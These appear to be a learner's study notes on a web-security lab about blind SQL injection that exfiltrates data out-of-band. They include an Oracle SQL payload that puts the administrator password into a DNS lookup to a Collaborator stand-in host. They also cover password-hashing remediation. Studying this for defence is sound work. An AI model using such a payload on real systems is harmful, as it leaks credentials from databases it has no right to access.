# Blind SQL Injection with Out-of-Band Data Exfiltration

**Category:** SQL Injection
**Difficulty:** Practitioner
**Tools required:** Burp Suite **Professional** (Burp Collaborator client is
Pro-only)
**Status:** 📝 Studied via walkthrough — not yet personally executed

*Note: I have not solved this lab myself. These are notes I took while
studying a walkthrough for later revision, since I don't currently have Burp
Suite Pro access needed for Burp Collaborator. I'm documenting the
methodology here to show I understand the technique, not to claim
completion.*

---

## Objective

This builds directly on the OOB interaction technique — instead of just
proving a DNS lookup can be triggered, the goal is to actually **exfiltrate
data** (the administrator's password) by embedding it inside the DNS lookup
itself, so it can be read from Collaborator's interaction log.

## Vulnerability Overview

Once out-of-band interaction is confirmed possible, the same mechanism can be
used to leak arbitrary data: by concatenating a sensitive value (like a
password) directly into the subdomain being looked up, the value becomes
visible in the DNS query itself, which Collaborator logs and displays.

## Methodology (as studied)

1. Confirm the out-of-band channel works using the interaction technique from
   the previous lab.
2. Instead of a static Collaborator subdomain, dynamically build the
   subdomain to include the value being exfiltrated, e.g. concatenating the
   administrator's password as a prefix to the Collaborator domain:
   ```sql
   SELECT EXTRACTVALUE(xmltype(
     '<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [ <!ENTITY % remote SYSTEM
     "http://' || (SELECT password FROM users WHERE username='administrator')
     || '.COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')
   FROM dual
   ```
   *(Oracle-style example; exact syntax varies by engine, per the cheat
   sheet.)*
3. Send the payload via Repeater.
4. Poll Burp Collaborator for the resulting DNS interaction — the subdomain
   logged will contain the leaked value as its prefix, readable directly in
   the interaction log.
5. Copy the leaked password from the Collaborator log and use it to log in as
   `administrator`.

## Why I Haven't Executed This Yet

Same constraint as the previous lab — this technique is entirely dependent on
Burp Collaborator, which requires Burp Suite Professional. Without it, there
is no way to generate a monitorable external domain or view resulting
interaction logs.

## Planned Remediation (if I were the developer)

Beyond disabling outbound-network-capable database functions (as with the
interaction lab), sensitive columns like passwords should never be stored or
processed in a way that lets them be concatenated into strings the database
itself controls the transmission of — hashing passwords properly means even
full exfiltration only yields a non-reversible hash, not a usable credential.

## Key Takeaway

This walkthrough made clear that out-of-band interaction isn't just a
detection technique — it's a full exfiltration channel once you can control
what gets embedded in the outbound request. It also reinforced, once again,
why passwords should be hashed: even a fully successful version of this
attack should never yield a directly usable plaintext credential in a
properly built application.
